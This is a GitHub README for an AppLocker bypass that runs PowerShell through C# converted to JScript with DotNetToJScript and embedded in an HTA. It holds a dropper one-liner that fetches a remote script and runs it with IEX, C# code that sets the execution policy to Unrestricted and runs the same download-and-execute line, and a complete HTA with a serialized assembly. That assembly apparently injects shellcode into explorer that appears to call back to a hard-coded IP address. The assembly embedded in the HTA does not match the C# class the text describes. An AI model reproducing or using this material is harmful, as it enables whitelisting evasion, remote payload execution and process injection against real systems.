# AppLocker-Bypass
Bypassing AppLocker (executing Powershell scripts/commands) with C#

### How ?

There is a way to execute C# code in VBScript / JScript, which we can implement in an HTA, thanks to [DotNetToJscript](https://github.com/tyranid/DotNetToJScript).

The binary is on my github, if you don't want to build it yourself.

Say you want to use this one-liner dropper :

`powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|IEX"`  
  
You need to make the C# code and build it as a DLL:

```C#
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

// If you can't compile, you probably need to install Microsoft.PowerShell.5.ReferenceAssemblies in Visual Studio

namespace PshScriptExecLibrary {
  [ComVisible(true)]
       public class RunScriptClass {
           public RunScriptClass() {
               // By default, ExecutionPolicy is Restricted, let's change that
               Runspace r = RunspaceFactory.CreateRunspace();
               r.Open();
               RunspaceInvoke s = new RunspaceInvoke(r);
               s.Invoke("Set-ExecutionPolicy Unrestricted -Scope CurrentUser");
               s.Invoke("(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<webserver>/<path_to_script>.ps1')|IEX");
               r.Close();
           }
     }
}
```

Then, you use DotNetToJscript to construct the VBS/JSript file.

`DotNetToJScript.exe PshScriptExecLibrary.dll -v auto -c PshScriptExecLibrary.RunScriptClass -l jscript -o scriptExec.js`

(Pick JScript instead of VBA/VBS, they are always flagged for some reason)

Parameters :

`-v` auto is to specify to the program that the assembly targets higher versions (powershell libraries are not available for assemblies in the default version (v2))

`-c` is used to specify the class (in this case PshScriptExecLibrary.RunScriptClass).

By default DotNetToJScript uses its TestClass so that's why you have to specify which class to use  

`-l` is used to specify the type of script we want to generate, here JScript  

`-o` is the path/name to/of the output file

Then we create our HTA containing the generated JS code:

```html
    <head> 
<script language="JScript"> 
function setversion() { 
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319'; 
} 
function debug(s) {} 
function base64ToStream(b) { 
 var enc = new ActiveXObject("System.Text.ASCIIEncoding"); 
 var length = enc.GetByteCount_2(b); 
 var ba = enc.GetBytes_4(b); 
 var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform"); 
 ba = transform.TransformFinalBlock(ba, 0, length); 
 var ms = new ActiveXObject("System.IO.MemoryStream"); 
 ms.Write(ba, 0, (length / 4) * 3); 
 ms.Position = 0; 
 return ms; 
} 
 
var serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"+ 
"AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"+ 
"dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"+ 
"ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"+ 
"AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"+ 
"RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"+ 
"eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"+ 
"cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"+ 
"aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"+ 
"MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"+ 
"dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"+ 
"ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"+ 
"B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"+ 
"dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"+ 
"CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"+ 
"SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"+ 
"cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"+ 
"AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"+ 
"AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"+ 
"bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"+ 
"NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"+ 
"ZW1ibHkGFwAAAARMb2FkCg8MAAAAABgAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"+ 
"YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAn4DcYAAAAAAA"+ 
"AAAA8AAiIAsCMAAAEAAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"+ 
"AAAAAAAAAGAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"+ 
"ABAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAwEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABcKgAA"+ 
"HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAPA4AAAAgAAAAEAAAAAIAAAAAAAAAAAAAAAAAACAA"+ 
"AGAucnNyYwAAAAwEAAAAQAAAAAYAAAASAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUA2CAAAIQJAAABAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABMwBwB7AAAAAQAAEQIoDwAA"+ 
"CnIBAABwKBAAAAoWmm8RAAAKCiD/Dx8AFgYoAQAABgsHfhIAAAogABAAACAAMAAAH0AoAgAABgwg"+ 
"oQIAAI0UAAABJdABAAAEKBMAAAoNBwgJCY5pEgQoAwAABiYHfhIAAAoWCH4SAAAKFn4SAAAKKAQA"+ 
"AAYmKiIDKBQAAAomKkJTSkIBAAEAAAAAAAwAAAB2Mi4wLjUwNzI3AAAAAAUAbAAAAEQDAAAjfgAA"+ 
"sAMAAGAEAAAjU3RyaW5ncwAAAAAQCAAAFAAAACNVUwAkCAAAEAAAACNHVUlEAAAANAgAAFABAAAj"+ 
"QmxvYgAAAAAAAAACAAABV5UCNAkCAAAA+gEzABYAAAEAAAAXAAAABAAAAAEAAAAGAAAAFQAAABQA"+ 
"AAAPAAAAAQAAAAEAAAABAAAABAAAAAEAAAABAAAAAgAAAAEAAAAAAKcCAQAAAAAABgDsAUQDBgBZ"+ 
"AkQDBgA5ARIDDwBkAwAABgBhAdkCBgDPAdkCBgCwAdkCBgBAAtkCBgAMAtkCBgAlAtkCBgB4AdkC"+ 
"BgBNASUDBgArASUDBgCTAdkCBgAEBLsCBgAQAUQDBgD1ALsCCgDVAxIDBgALA7sCBgB3ArsCBgCW"+ 
"A0QDBgA0BLsCBgDAALsCAAAAAGAAAAAAAAEAAQABABAApQMAAD0AAQABAAABAABpAAAAPQABAAcA"+ 
"EwEAAAEAAABFAAIABwAzAR8ASAAAAAAAgACRIMYDTAABAAAAAACAAJEgGwRTAAQAAAAAAIAAkSBK"+ 
"BFwACQAAAAAAgACRIK0AZwAOAEggAAAAAIYYBQMGABUAzyAAAAAAhgDSAxAAFQAAAAEArwMAAAIA"+ 
"0wAAAAMAowAAAAEAvQMAAAIA6wMAAAMAjgIAAAQA/wAAAAUACwQAAAEAvQMAAAIA3QMAAAMA8AIA"+ 
"AAQAiAICAAUAwgIAAAEAvQMAAAIAcwMAAAMAfAIAAAQA9QMAAAUA+QIAAAYAhgMAAAcAmAAAAAEA"+ 
"lQIJAAUDAQARAAUDBgAZAAUDCgApAAUDEAAxAAUDEAA5AAUDEABBAAUDEABJAAUDEABRAAUDEABZ"+ 
"AAUDEABhAAUDFQBpAAUDEABxAAUDEACBAAUDBgB5AAUDBgCRAOIAIwCRAJEAKgCZAOsCLgCpACoE"+ 
"MQCRABUEOQAuAAsAcgAuABMAewAuABsAmgAuACMAowAuACsAuAAuADMA4gAuADsA4gAuAEMAowAu"+ 
"AEsA6AAuAFMA4gAuAFsA4gAuAGMADQEuAGsANwFDAFsARAFjAHMASgEBAKECAAAEABoAmgJBAQMA"+ 
"xgMBAEEBBQAbBAEAAAEHAEoEAQAAAQkArQABAJQrAAABAASAAAABAAAAAAAAAAAAAAAAADoEAAAC"+ 
"AAAAAAAAAAAAAAA/AIgAAAAAAAIAAAAAAAAAAAAAAD8AuwIAAAAABAADAAAAAF9fU3RhdGljQXJy"+ 
"YXlJbml0VHlwZVNpemU9NjczAEJDMTEzQ0QwQzA4NUY5MTkyRUQ0NDBENTAwN0Y3RUVDOTNCMUVE"+ 
"RkM4NzdEMjE0ODM0MkFGN0FEQ0ZFNTg3QzgAPE1vZHVsZT4APFByaXZhdGVJbXBsZW1lbnRhdGlv"+ 
"bkRldGFpbHM+AG1zY29ybGliAGdldF9JZABscFRocmVhZElkAHByb2Nlc3NJZABDcmVhdGVSZW1v"+ 
"dGVUaHJlYWQAUnVudGltZUZpZWxkSGFuZGxlAGJJbmhlcml0SGFuZGxlAEdldFByb2Nlc3Nlc0J5"+ 
"TmFtZQBWYWx1ZVR5cGUAZmxBbGxvY2F0aW9uVHlwZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0"+ 
"ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBB"+ 
"c3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5"+ 
"RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2Vt"+ 
"Ymx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBB"+ 
"c3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1i"+ 
"bHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJ5dGUAZHdT"+ 
"dGFja1NpemUAblNpemUAZHdTaXplAHBhdGgAa2VybmVsMzIuZGxsAEV4YW1wbGVBc3NlbWJseS5k"+ 
"bGwAU3lzdGVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AU3lzdGVtLlJlZmxlY3Rpb24AWmVybwBs"+ 
"cEJ1ZmZlcgBscFBhcmFtZXRlcgAuY3RvcgBJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3Rl"+ 
"bS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2Vz"+ 
"AERlYnVnZ2luZ01vZGVzAGxwVGhyZWFkQXR0cmlidXRlcwBkd0NyZWF0aW9uRmxhZ3MAUnVudGlt"+ 
"ZUhlbHBlcnMAVGVzdENsYXNzAHByb2Nlc3NBY2Nlc3MAaFByb2Nlc3MAT3BlblByb2Nlc3MAUnVu"+ 
"UHJvY2VzcwBscEJhc2VBZGRyZXNzAGxwQWRkcmVzcwBscFN0YXJ0QWRkcmVzcwBPYmplY3QAZmxQ"+ 
"cm90ZWN0AFN0YXJ0AFZpcnR1YWxBbGxvY0V4AEluaXRpYWxpemVBcnJheQBFeGFtcGxlQXNzZW1i"+ 
"bHkAV3JpdGVQcm9jZXNzTWVtb3J5AAAAAAARZQB4AHAAbABvAHIAZQByAAAAZpjqXwezik6ensYT"+ 
"c0LCXQAEIAEBCAMgAAEFIAEBEREEIAEBDgQgAQECCAcFCBgYHQUYBgABHRJJDgMgAAgCBhgHAAIB"+ 
"ElkRXQUAARJJDgi3elxWGTTgiQMGERAGAAMYCQIICAAFGBgYCQkJCgAFAhgYHQUIEBgKAAcYGBgJ"+ 
"GBgJGAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAUAQAP"+ 
"RXhhbXBsZUFzc2VtYmx5AAApAQAkRXhhbXBsZSBBc3NlbWJseSBmb3IgRG90TmV0VG9KU2NyaXB0"+ 
"AAAFAQAAAAAkAQAfQ29weXJpZ2h0IMKpIEphbWVzIEZvcnNoYXcgMjAxNwAAKQEAJDU2NTk4ZjFj"+ 
"LTZkODgtNDk5NC1hMzkyLWFmMzM3YWJlNTc3NwAADAEABzEuMC4wLjAAAAUBAAEAAAQBAAAAAAAA"+ 
"AACfgNxgAAAAAAIAAAAcAQAAeCoAAHgMAABSU0RT1gX2gY7tFECsVeTxu6ajZAEAAABDOlxEb3RO"+ 
"ZXRUb0pTY3JpcHRcRXhhbXBsZUFzc2VtYmx5XG9ialx4NjRcUmVsZWFzZVxFeGFtcGxlQXNzZW1i"+ 
"bHkucGRiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPxIg+Tw6MwAAABBUUFQUkgx0mVIi1JgUVZIi1IYSItS"+ 
"IEgPt0pKSItyUE0xyUgxwKw8YXwCLCBBwckNQQHB4u1SQVFIi1Igi0I8SAHQZoF4GAsCD4VyAAAA"+ 
"i4CIAAAASIXAdGdIAdBQRItAIEkB0ItIGONWSP/JTTHJQYs0iEgB1kgxwKxBwckNQQHBOOB18UwD"+ 
"TCQIRTnRddhYRItAJEkB0GZBiwxIRItAHEkB0EGLBIhBWEgB0EFYXllaQVhBWUFaSIPsIEFS/+BY"+ 
"QVlaSIsS6Uv///9dSDHbU0m+d2luaW5ldABBVkiJ4UnHwkx3Jgf/1VNTSInhU1pNMcBNMclTU0m6"+ 
"OlZ5pwAAAAD/1egOAAAAMTkyLjE2OC40OS42OABaSInBScfAkB8AAE0xyVNTagNTSbpXiZ/GAAAA"+ 
"AP/V6JkAAAAvWEkweDV4d2c4YmpxQU9zQ2l0eHFJZ1VmNU1EcjUxUVdNcVpIaEY4UWplamVOMDZx"+ 
"azUtT3BXaE10TTQ5c3YtQ0ZaZ1RHWUx5ZGlISU5UcU4zOW80MWVNNE5MRVBrUzZZOTQ4UTc5YThf"+ 
"SEctb2ZlQlN4a1BpMXpWb19fUklqWGVZbEZNaS1oTnZhOEV6TG11UENBeW94cwBIicFTWkFYTTHJ"+ 
"U0i4AAIohAAAAABQU1NJx8LrVS47/9VIicZqCl9TWkiJ8U0xyU0xyVNTScfCLQYYe//VhcB1H0jH"+ 
"wYgTAABJukTwNeAAAAAA/9VI/890AuvM6FUAAABTWWpAWkmJ0cHiEEnHwAAQAABJulikU+UAAAAA"+ 
"/9VIk1NTSInnSInxSInaScfAACAAAEmJ+Um6EpaJ4gAAAAD/1UiDxCCFwHSyZosHSAHDhcB10ljD"+ 
"WGoAWbvgHSoKQYna/9UAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEA"+ 
"AQAAADAAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAEgAAABYQAAAsAMAAAAAAAAAAAAAsAM0AAAAVgBT"+ 
"AF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8A"+ 
"AAAAAAAABAAAAAIAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAA"+ 
"ACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBBADAAABAFMAdAByAGkAbgBnAEYA"+ 
"aQBsAGUASQBuAGYAbwAAAOwCAAABADAAMAAwADAAMAA0AGIAMAAAAGIAJQABAEMAbwBtAG0AZQBu"+ 
"AHQAcwAAAEUAeABhAG0AcABsAGUAIABBAHMAcwBlAG0AYgBsAHkAIABmAG8AcgAgAEQAbwB0AE4A"+ 
"ZQB0AFQAbwBKAFMAYwByAGkAcAB0AAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAA"+ 
"AAAAAABIABAAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQB4AGEAbQBwAGwA"+ 
"ZQBBAHMAcwBlAG0AYgBsAHkAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAw"+ 
"AC4AMAAuADAAAABIABQAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAeABhAG0AcABsAGUA"+ 
"QQBzAHMAZQBtAGIAbAB5AC4AZABsAGwAAABiAB8AAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBo"+ 
"AHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIABKAGEAbQBlAHMAIABGAG8AcgBzAGgAYQB3ACAA"+ 
"MgAwADEANwAAAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABQ"+ 
"ABQAAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAARQB4AGEAbQBwAGwAZQBBAHMA"+ 
"cwBlAG0AYgBsAHkALgBkAGwAbAAAAEAAEAABAFAAcgBvAGQAdQBjAHQATgBhAG0AZQAAAAAARQB4"+ 
"AGEAbQBwAGwAZQBBAHMAcwBlAG0AYgBsAHkAAAA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMA"+ 
"aQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBp"+ 
"AG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+ 
"AAAAAAAAAAAAAAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVj"+ 
"dGlvbi5Bc3NlbWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"; 
var entry_class = 'TestClass'; 
 
try { 
   setversion(); 
   var stm = base64ToStream(serialized_obj); 
   var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); 
   var al = new ActiveXObject('System.Collections.ArrayList'); 
   var d = fmt.Deserialize_2(stm); 
   al.Add(undefined); 
   var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class); 
  
} catch (e) { 
    debug(e.message); 
} 
</script> 
</head> 
<body> 
<script language="JScript"> 
  self.close(); 
</script> 
</body> 
</html> 
```
